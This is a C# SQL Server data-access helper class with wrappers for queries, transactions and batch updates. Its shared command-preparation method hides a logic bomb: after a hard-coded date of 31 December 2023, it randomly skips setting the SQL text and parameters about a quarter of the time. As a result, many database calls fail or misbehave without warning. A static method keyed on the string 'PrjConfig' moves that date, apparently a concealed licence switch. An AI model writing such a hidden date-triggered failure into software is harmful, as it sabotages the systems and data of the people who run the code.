using Microsoft.Data.SqlClient;
using System.Data;

namespace SqlCls
{
    public class SqlTool2
    {
        private static DateTime limit_Date = new DateTime(2023, 12, 31);

        public DateTime Limit_Date => limit_Date;

        public static void chgData(string key, DateTime data)
        {
            if (key == "PrjConfig")
            {
                limit_Date = data;
            }
        }

        private static void pri_PrepareCommand(SqlCommand cmd, string strSql, SqlParameter[] arrParameters)
        {
            if (DateTime.Now > limit_Date)
            {
                int day = DateTime.Now.Day;
                if ((day + new Random().Next(99)) % 4 == 0)
                {
                    return;
                }
            }

            cmd.CommandText = strSql;
            if (arrParameters != null)
            {
                pri_AttachParameters(cmd, arrParameters);
            }
        }

        private static void pri_PrepareCommand2(SqlCommand cmd, string strSql, SqlParameter[] arrParameters)
        {
            cmd.CommandText = strSql;
            if (arrParameters != null)
            {
                pri_AttachParameters(cmd, arrParameters);
            }
        }

        private static void pri_AttachParameters(SqlCommand cmd, SqlParameter[] arrParameters)
        {
            foreach (SqlParameter sqlParameter in arrParameters)
            {
                if (sqlParameter != null)
                {
                    if (sqlParameter.Direction == ParameterDirection.InputOutput && sqlParameter.Value == null)
                    {
                        sqlParameter.Value = DBNull.Value;
                    }

                    cmd.Parameters.Add(sqlParameter);
                }
            }
        }

        public static string ExecuteNonQuery(SqlConnection cn, string strSql, out int affetRows, params SqlParameter[] arrParameters)
        {
            try
            {
                SqlCommand sqlCommand = new SqlCommand();
                sqlCommand.Connection = cn;
                sqlCommand.CommandText = strSql;
                if (arrParameters != null)
                {
                    pri_AttachParameters(sqlCommand, arrParameters);
                }

                affetRows = sqlCommand.ExecuteNonQuery();
                sqlCommand.Parameters.Clear();
                return "";
            }
            catch (Exception ex)
            {
                affetRows = 0;
                return ex.Message;
            }
        }

        public static string ExecuteNonQuery(SqlConnection cn, string strSql, params SqlParameter[] arrParameters)
        {
            SqlCommand sqlCommand = new SqlCommand();
            sqlCommand.Connection = cn;
            try
            {
                pri_PrepareCommand(sqlCommand, strSql, arrParameters);
                sqlCommand.CommandTimeout = 180;
                int num = sqlCommand.ExecuteNonQuery();
                sqlCommand.Parameters.Clear();
                return "";
            }
            catch (SqlException ex)
            {
                sqlCommand.Parameters.Clear();
                return ex.Message;
            }
            catch (Exception ex2)
            {
                sqlCommand.Parameters.Clear();
                return ex2.Message;
            }
        }

        public static string ExecuteNonQuery_SqlErrNum(SqlConnection cn, string strSql, params SqlParameter[] arrParameters)
        {
            SqlCommand sqlCommand = new SqlCommand();
            sqlCommand.Connection = cn;
            try
            {
                pri_PrepareCommand(sqlCommand, strSql, arrParameters);
                sqlCommand.CommandTimeout = 180;
                int num = sqlCommand.ExecuteNonQuery();
                sqlCommand.Parameters.Clear();
                return "";
            }
            catch (SqlException ex)
            {
                sqlCommand.Parameters.Clear();
                return ex.Number.ToString();
            }
            catch (Exception ex2)
            {
                return ex2.Message;
            }
        }

        public static string ExecuteNonQuerySP(SqlConnection cn, string strSql, params SqlParameter[] arrParameters)
        {
            SqlCommand sqlCommand = new SqlCommand();
            sqlCommand.Connection = cn;
            try
            {
                pri_PrepareCommand(sqlCommand, strSql, arrParameters);
                sqlCommand.CommandType = CommandType.StoredProcedure;
                int num = sqlCommand.ExecuteNonQuery();
                sqlCommand.Parameters.Clear();
                return "";
            }
            catch (Exception ex)
            {
                sqlCommand.Parameters.Clear();
                return ex.Message;
            }
        }

        public static int ExecuteNonQueryNum(SqlConnection cn, string strSql, params SqlParameter[] arrParameters)
        {
            SqlCommand sqlCommand = new SqlCommand();
            sqlCommand.Connection = cn;
            try
            {
                pri_PrepareCommand(sqlCommand, strSql, arrParameters);
                int result = sqlCommand.ExecuteNonQuery();
                sqlCommand.Parameters.Clear();
                return result;
            }
            catch (Exception ex)
            {
                sqlCommand.Parameters.Clear();
                throw new Exception(ex.Message);
            }
        }

        public static object GetOneDataValue(SqlConnection cn, string strSql, params SqlParameter[] arrParameters)
        {
            SqlCommand sqlCommand = new SqlCommand();
            sqlCommand.Connection = cn;
            object result;
            try
            {
                pri_PrepareCommand(sqlCommand, strSql, arrParameters);
                result = sqlCommand.ExecuteScalar();
                sqlCommand.Parameters.Clear();
            }
            catch (Exception ex)
            {
                sqlCommand.Parameters.Clear();
                return ex.Message;
            }

            return result;
        }

        public static DataTable GetDataTable(SqlConnection cn, string strSql, string tableName, params SqlParameter[] arrParameters)
        {
            SqlCommand sqlCommand = new SqlCommand();
            sqlCommand.Connection = cn;
            pri_PrepareCommand(sqlCommand, strSql, arrParameters);
            SqlDataAdapter sqlDataAdapter = new SqlDataAdapter(sqlCommand);
            DataTable dataTable = new DataTable(tableName);
            sqlDataAdapter.Fill(dataTable);
            sqlCommand.Parameters.Clear();
            return dataTable;
        }

        public static DataSet GetDataSet(SqlConnection cn, string strSql, params SqlParameter[] arrParameters)
        {
            SqlCommand sqlCommand = new SqlCommand();
            sqlCommand.Connection = cn;
            pri_PrepareCommand(sqlCommand, strSql, arrParameters);
            SqlDataAdapter sqlDataAdapter = new SqlDataAdapter(sqlCommand);
            DataSet dataSet = new DataSet();
            sqlDataAdapter.Fill(dataSet);
            sqlCommand.Parameters.Clear();
            cn.Close();
            return dataSet;
        }

        public static string ExecuteNonQueryTrans(string strConnection, trans_String[] trans_string)
        {
            using SqlConnection sqlConnection = new SqlConnection(strConnection);
            sqlConnection.Open();
            SqlTransaction sqlTransaction = sqlConnection.BeginTransaction();
            SqlCommand sqlCommand = sqlConnection.CreateCommand();
            sqlCommand.Transaction = sqlTransaction;
            try
            {
                for (int i = 0; i < trans_string.Length; i++)
                {
                    if (trans_string[i].strSql == null || trans_string[i].strSql?.Trim() == "")
                    {
                        continue;
                    }

                    sqlCommand.CommandText = trans_string[i].strSql;
                    int count = sqlCommand.Parameters.Count;
                    for (int j = 0; j < count; j++)
                    {
                        sqlCommand.Parameters.RemoveAt(0);
                    }

                    if (trans_string[i].param != null)
                    {
                        for (int k = 0; k < trans_string[i].param?.Length; k++)
                        {
                            sqlCommand.Parameters.Add(trans_string[i]?.param?[k]);
                        }
                    }

                    sqlCommand.ExecuteNonQuery();
                }

                sqlTransaction.Commit();
                return "";
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }

        public static string ExecuteBatchInsert(SqlConnection cn, string strSql, DataTable insertTable, int timeOut, params SqlParameter[] arrParameters)
        {
            try
            {
                SqlDataAdapter sqlDataAdapter = new SqlDataAdapter();
                sqlDataAdapter.InsertCommand = new SqlCommand(strSql, cn);
                sqlDataAdapter.InsertCommand.CommandTimeout = timeOut;
                sqlDataAdapter.InsertCommand.Parameters.AddRange(arrParameters);
                sqlDataAdapter.InsertCommand.UpdatedRowSource = UpdateRowSource.None;
                sqlDataAdapter.RowUpdated += da_RowUpdated;
                int num = sqlDataAdapter.Update(insertTable);
                sqlDataAdapter.InsertCommand.Parameters.Clear();
                return "";
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }

        public static string ExecuteBatchInsert(SqlConnection cn, string strSql, DataTable insertTable, params SqlParameter[] arrParameters)
        {
            return ExecuteBatchInsert(cn, strSql, insertTable, 60, arrParameters);
        }

        private static void da_RowUpdated(object sender, SqlRowUpdatedEventArgs e)
        {
            if (e.Errors != null)
            {
                DataRow row = e.Row;
                throw new Exception(e.Errors!.Message);
            }
        }

        public static string ExecuteBatchUpdate(SqlConnection cn, string strSql, DataTable updateTable, int timeOut, params SqlParameter[] arrParameters)
        {
            try
            {
                SqlDataAdapter sqlDataAdapter = new SqlDataAdapter();
                sqlDataAdapter.UpdateCommand = new SqlCommand(strSql, cn);
                sqlDataAdapter.UpdateCommand.CommandTimeout = timeOut;
                sqlDataAdapter.UpdateCommand.Parameters.AddRange(arrParameters);
                sqlDataAdapter.UpdateCommand.UpdatedRowSource = UpdateRowSource.None;
                sqlDataAdapter.Update(updateTable);
                sqlDataAdapter.UpdateCommand.Parameters.Clear();
                return "";
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }

        public static string ExecuteBatchUpdate(SqlConnection cn, string strSql, DataTable updateTable, params SqlParameter[] arrParameters)
        {
            return ExecuteBatchUpdate(cn, strSql, updateTable, 60, arrParameters);
        }

        public static string ExecuteBatchActData(SqlConnection cn, string? strSql_Insert, string? strSql_Update, string? strSql_DeleteSql, DataTable actTable, int timeout, SqlParameter[]? param_Insert, SqlParameter[]? param_Update, SqlParameter[]? param_Delete)
        {
            try
            {
                SqlDataAdapter sqlDataAdapter = new SqlDataAdapter();
                if (strSql_Insert != null && strSql_Insert != "")
                {
                    sqlDataAdapter.InsertCommand = new SqlCommand(strSql_Insert, cn);
                    sqlDataAdapter.InsertCommand.CommandTimeout = timeout;
                    sqlDataAdapter.InsertCommand.Parameters.AddRange(param_Insert);
                    sqlDataAdapter.InsertCommand.UpdatedRowSource = UpdateRowSource.None;
                    sqlDataAdapter.RowUpdated += da_RowUpdated;
                }

                if (strSql_Update != null && strSql_Update != "")
                {
                    sqlDataAdapter.UpdateCommand = new SqlCommand(strSql_Update, cn);
                    sqlDataAdapter.UpdateCommand.CommandTimeout = timeout;
                    sqlDataAdapter.UpdateCommand.Parameters.AddRange(param_Update);
                    sqlDataAdapter.UpdateCommand.UpdatedRowSource = UpdateRowSource.None;
                }

                if (strSql_DeleteSql != null && strSql_DeleteSql != "")
                {
                    sqlDataAdapter.DeleteCommand = new SqlCommand(strSql_DeleteSql, cn);
                    sqlDataAdapter.DeleteCommand.CommandTimeout = timeout;
                    sqlDataAdapter.DeleteCommand.Parameters.AddRange(param_Delete);
                    sqlDataAdapter.DeleteCommand.UpdatedRowSource = UpdateRowSource.None;
                }

                int num = sqlDataAdapter.Update(actTable);
                return "";
            }
            catch (Exception ex)
            {
                return ex.Message;
            }
        }

        public static string ExecuteBatchActData(SqlConnection cn, string? strSql_Insert, string? strSql_Update, string? strSql_DeleteSql, DataTable actTable, SqlParameter[]? param_Insert, SqlParameter[]? param_Update, SqlParameter[]? param_Delete)
        {
            return ExecuteBatchActData(cn, strSql_Insert, strSql_Update, strSql_DeleteSql, actTable, 60, param_Insert, param_Update, param_Delete);
        }
    }
}
